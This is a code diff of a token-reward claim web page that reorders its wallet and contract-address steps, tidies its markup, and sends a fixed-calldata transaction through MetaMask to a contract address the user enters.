@@ -638,7 +638,6 @@
     }
   </style>
 </head>
-
 <body>
   <div class="page-wrap">
 
@@ -655,14 +654,13 @@
 
     <div class="notice">
       <span class="notice-icon">💰</span>
-      <span><strong>Claim your rewards!</strong> Your total earned amount is shown below. Click Claim to receive your
-        OZONE tokens.</span>
-    </div
+      <span><strong>Claim your rewards!</strong> Your total earned amount is shown below. Click Claim to receive your OZONE tokens.</span>
+    </div>
 
-    <!-- Step 1 -->
+    <!-- Step 1: Wallet (moved first for better UX) -->
     <div class="card">
       <div class="card-header">
-        <div class="step-badge">2</div>
+        <div class="step-badge">1</div>
         <div class="card-title">Your Wallet</div>
       </div>
       <div class="field">
@@ -671,29 +669,29 @@
           <span class="req-tag">Required</span>
         </div>
         <div class="input-wrap">
-          <input type="text" id="walletAddress" placeholder="Connect or paste address" autocomplete="off"
-            spellcheck="false" inputmode="text" />
+          <input type="text" id="walletAddress" placeholder="Connect or paste address" autocomplete="off" spellcheck="false" inputmode="text" />
           <button class="btn-connect" id="btnConnect">Connect Wallet</button>
         </div>
         <div class="field-hint" id="walletStatus">Connect MetaMask to see your claimable amount</div>
       </div>
     </div>
 
-      <!-- Step 2 -->
+    <!-- Step 2: Contract Address -->
     <div class="card">
       <div class="card-header">
-        <div class="step-badge">1</div>
+        <div class="step-badge">2</div>
         <div class="card-title">Contract Address</div>
       </div>
       <div class="field">
         <div class="field-label">
           Proxy Contract Address
-          <span class="req-tag">Auto-filled</span>
+          <span class="req-tag">Required</span>
         </div>
         <input type="text" id="proxyAddress" placeholder="0x..." autocomplete="off" spellcheck="false" value="" />
-        <div class="field-hint">Your NFTWall smart contract instance</div>
+        <div class="field-hint">Your NFTWall smart contract instance (paste your contract address)</div>
       </div>
     </div>
+
     <!-- TX Preview -->
     <div class="tx-preview" id="txPreview">
       <div class="tx-preview-header">Transaction Preview</div>
@@ -758,150 +756,149 @@
 
   </div>
 
- <script>
-  const proxyInput = document.getElementById('proxyAddress');
-  const walletInput = document.getElementById('walletAddress');
-  const btnClaim = document.getElementById('btnClaim');
-  const txPreview = document.getElementById('txPreview');
-  const statusLog = document.getElementById('statusLog');
-  const logCard = document.getElementById('logCard');
-  const successCard = document.getElementById('successCard');
-  
-  let currentClaimValue = 160000;
+  <script>
+    const proxyInput = document.getElementById('proxyAddress');
+    const walletInput = document.getElementById('walletAddress');
+    const btnClaim = document.getElementById('btnClaim');
+    const txPreview = document.getElementById('txPreview');
+    const statusLog = document.getElementById('statusLog');
+    const logCard = document.getElementById('logCard');
+    const successCard = document.getElementById('successCard');
+    
+    let currentClaimValue = 160000;
 
-  function isAddress(v) { return /^0x[0-9a-fA-F]{40}$/.test(v.trim()); }
+    function isAddress(v) { return /^0x[0-9a-fA-F]{40}$/.test(v.trim()); }
 
-  function truncate(addr) { return addr.slice(0,8) + '...' + addr.slice(-5); }
+    function truncate(addr) { return addr.slice(0,8) + '...' + addr.slice(-5); }
 
-  function log(msg, type = 'info') {
-    logCard.classList.add('visible');
-    const now = new Date();
-    const t = now.toTimeString().slice(0,8);
-    const line = document.createElement('div');
-    line.className = 'log-line';
-    line.innerHTML = `<span class="log-time">${t}</span><span class="log-msg ${type}">${msg}</span>`;
-    statusLog.appendChild(line);
-    statusLog.scrollTop = statusLog.scrollHeight;
-  }
-
-  function checkReady() {
-    const p = proxyInput.value.trim();
-    const w = walletInput.value.trim();
-    const ready = isAddress(p) && isAddress(w);
-    btnClaim.disabled = !ready;
-
-    if (ready) {
-      btnClaim.innerHTML = '💰 Claim Reward';
-      document.getElementById('previewParams').textContent = `0, ${currentClaimValue}, 0, 7`;
-    } else {
-      btnClaim.innerHTML = 'Connect Wallet to Claim';
+    function log(msg, type = 'info') {
+      logCard.classList.add('visible');
+      const now = new Date();
+      const t = now.toTimeString().slice(0,8);
+      const line = document.createElement('div');
+      line.className = 'log-line';
+      line.innerHTML = `<span class="log-time">${t}</span><span class="log-msg ${type}">${msg}</span>`;
+      statusLog.appendChild(line);
+      statusLog.scrollTop = statusLog.scrollHeight;
     }
 
-    if (p.length > 2) proxyInput.className = isAddress(p) ? 'valid' : 'invalid';
-    else proxyInput.className = '';
-    if (w.length > 2) walletInput.className = isAddress(w) ? 'valid' : 'invalid';
-    else walletInput.className = '';
+    function checkReady() {
+      const p = proxyInput.value.trim();
+      const w = walletInput.value.trim();
+      const ready = isAddress(p) && isAddress(w);
+      btnClaim.disabled = !ready;
 
-    if (ready && isAddress(p) && isAddress(w)) {
-      txPreview.classList.add('visible');
-      document.getElementById('previewTo').textContent = truncate(p);
-      document.getElementById('previewFrom').textContent = truncate(w);
-    } else {
-      txPreview.classList.remove('visible');
-    }
-  }
-
-  proxyInput.addEventListener('input', checkReady);
-  walletInput.addEventListener('input', checkReady);
-
-  async function connectWallet() {
-    const btn = document.getElementById('btnConnect');
-    if (!window.ethereum) {
-      log('No EVM wallet found. Please install MetaMask.', 'error');
-      return;
-    }
-    try {
-      btn.textContent = '...';
-      btn.disabled = true;
-      log('Requesting wallet access...', 'info');
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      if (accounts.length > 0) {
-        walletInput.value = accounts[0];
-        document.getElementById('walletStatus').textContent = '✓ Connected: ' + truncate(accounts[0]);
-        btn.textContent = 'Connected ✓';
-        btn.classList.add('connected');
-        log('Wallet connected: ' + accounts[0], 'success');
-        document.getElementById('totalClaimable').textContent = 'Enter contract address above';
-        checkReady();
+      if (ready) {
+        btnClaim.innerHTML = '💰 Claim Reward';
+        document.getElementById('previewParams').textContent = `0, ${currentClaimValue}, 0, 7`;
+      } else {
+        btnClaim.innerHTML = 'Connect Wallet to Claim';
       }
-    } catch (err) {
-      btn.textContent = 'Connect Wallet';
-      btn.disabled = false;
-      log('Connection rejected: ' + err.message, 'error');
-    }
-  }
 
-  document.getElementById('btnConnect').onclick = connectWallet;
+      if (p.length > 2) proxyInput.className = isAddress(p) ? 'valid' : 'invalid';
+      else proxyInput.className = '';
+      if (w.length > 2) walletInput.className = isAddress(w) ? 'valid' : 'invalid';
+      else walletInput.className = '';
 
-  async function claimReward() {
-    const proxyAddress = proxyInput.value.trim();
-    const yourAddress = walletInput.value.trim();
-
-    if (!isAddress(proxyAddress) || !isAddress(yourAddress)) {
-      log('Invalid address(es). Please check and try again.', 'error');
-      return;
+      if (ready) {
+        txPreview.classList.add('visible');
+        document.getElementById('previewTo').textContent = truncate(p);
+        document.getElementById('previewFrom').textContent = truncate(w);
+      } else {
+        txPreview.classList.remove('visible');
+      }
     }
 
-    btnClaim.disabled = true;
-    btnClaim.innerHTML = '<div class="spinner"></div> Sending Transaction...';
-    successCard.classList.remove('visible');
+    proxyInput.addEventListener('input', checkReady);
+    walletInput.addEventListener('input', checkReady);
 
-    const hexValue = currentClaimValue.toString(16).padStart(64, '0');
-    const calldata = "0xa3e884b0"
-      + "0000000000000000000000000000000000000000000000000000000000000000"
-      + hexValue
-      + "0000000000000000000000000000000000000000000000000000000000000000"
-      + "0000000000000000000000000000000000000000000000000000000000000007";
-
-    log('Building transaction...', 'info');
-    log(`Claiming ~${(currentClaimValue / 160000 * 1.4).toFixed(2)} OZONE`, 'info');
-    log('To: ' + proxyAddress, 'info');
-    log('Awaiting wallet confirmation...', 'warn');
-
-    try {
-      if (!window.ethereum) throw new Error('No EVM wallet found.');
-
-      const tx = await window.ethereum.request({
-        method: 'eth_sendTransaction',
-        params: [{
-          from: yourAddress,
-          to: proxyAddress,
-          data: calldata,
-          gas: '0x200000'
-        }]
-      });
-
-      log('Transaction submitted!', 'success');
-      log('Hash: ' + tx, 'success');
-
-      document.getElementById('txHashVal').textContent = tx;
-      const explorerUrl = 'https://explorer.ozonechain.com/tx/' + tx;
-      document.getElementById('explorerLink').href = explorerUrl;
-      successCard.classList.add('visible');
-
-      btnClaim.classList.add('success-state');
-      btnClaim.innerHTML = '✓ Reward Claimed';
-
-    } catch (err) {
-      log('Error: ' + (err.message || JSON.stringify(err)), 'error');
-      btnClaim.disabled = false;
-      btnClaim.innerHTML = '💰 Claim Reward';
-      btnClaim.classList.remove('success-state');
+    async function connectWallet() {
+      const btn = document.getElementById('btnConnect');
+      if (!window.ethereum) {
+        log('No EVM wallet found. Please install MetaMask.', 'error');
+        return;
+      }
+      try {
+        btn.textContent = '...';
+        btn.disabled = true;
+        log('Requesting wallet access...', 'info');
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        if (accounts.length > 0) {
+          walletInput.value = accounts[0];
+          const statusEl = document.getElementById('walletStatus');
+          if (statusEl) statusEl.textContent = '✓ Connected: ' + truncate(accounts[0]);
+          btn.textContent = 'Connected ✓';
+          btn.classList.add('connected');
+          log('Wallet connected: ' + accounts[0], 'success');
+          checkReady();
+        }
+      } catch (err) {
+        btn.textContent = 'Connect Wallet';
+        btn.disabled = false;
+        log('Connection rejected: ' + err.message, 'error');
+      }
     }
-  }
 
-  window.claimReward = claimReward;
-</script>
+    document.getElementById('btnConnect').onclick = connectWallet;
+
+    async function claimReward() {
+      const proxyAddress = proxyInput.value.trim();
+      const yourAddress = walletInput.value.trim();
+
+      if (!isAddress(proxyAddress) || !isAddress(yourAddress)) {
+        log('Invalid address(es). Please check and try again.', 'error');
+        return;
+      }
+
+      btnClaim.disabled = true;
+      btnClaim.innerHTML = '<div class="spinner"></div> Sending Transaction...';
+      successCard.classList.remove('visible');
+
+      const hexValue = currentClaimValue.toString(16).padStart(64, '0');
+      const calldata = "0xa3e884b0"
+        + "0000000000000000000000000000000000000000000000000000000000000000"
+        + hexValue
+        + "0000000000000000000000000000000000000000000000000000000000000000"
+        + "0000000000000000000000000000000000000000000000000000000000000007";
+
+      log('Building transaction...', 'info');
+      log(`Claiming ~${(currentClaimValue / 160000 * 1.4).toFixed(2)} OZONE`, 'info');
+      log('To: ' + proxyAddress, 'info');
+      log('Awaiting wallet confirmation...', 'warn');
+
+      try {
+        if (!window.ethereum) throw new Error('No EVM wallet found.');
+
+        const tx = await window.ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: yourAddress,
+            to: proxyAddress,
+            data: calldata,
+            gas: '0x200000'
+          }]
+        });
+
+        log('Transaction submitted!', 'success');
+        log('Hash: ' + tx, 'success');
+
+        document.getElementById('txHashVal').textContent = tx;
+        const explorerUrl = 'https://explorer.ozonechain.com/tx/' + tx;
+        document.getElementById('explorerLink').href = explorerUrl;
+        successCard.classList.add('visible');
+
+        btnClaim.classList.add('success-state');
+        btnClaim.innerHTML = '✓ Reward Claimed';
+
+      } catch (err) {
+        log('Error: ' + (err.message || JSON.stringify(err)), 'error');
+        btnClaim.disabled = false;
+        btnClaim.innerHTML = '💰 Claim Reward';
+        btnClaim.classList.remove('success-state');
+      }
+    }
+
+    window.claimReward = claimReward;
+  </script>
 </body>
-
 </html>
